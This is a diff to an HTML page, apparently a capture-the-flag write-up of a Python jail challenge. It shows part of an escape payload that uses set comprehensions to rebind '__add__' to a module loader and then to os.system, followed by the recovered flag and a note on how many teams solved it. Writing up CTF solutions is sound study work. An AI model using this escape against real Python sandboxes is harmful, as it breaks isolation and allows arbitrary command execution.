@@ -287,12 +287,17 @@ a.b = c
     for loader in {W+122}
     for loader in {loader.load_module}
     for W.__class__.__add__ in {loader.__call__}
-    for module in {W+os}for W.__class__.__add__ in {module.system}
+    for module in {W+os} for W.__class__.__add__ in {module.system}
 }</code></pre>
       <p>
         Running the script, then <code>cat flag.txt</code> reveals the flag.
       </p>
       <pre><code class="language-plaintext">jail{who_uses_setcomps_ever?_c21b2ee0b71}</code></pre>
+      <p>
+        In the competition, this problem was solved by 3 other teams, making it
+        one of the harder problems. If you're wondering about
+        <code>__freebie__</code>, ultimately it was just a red herring :P
+      </p>
     </article>
   </body>
 </html>
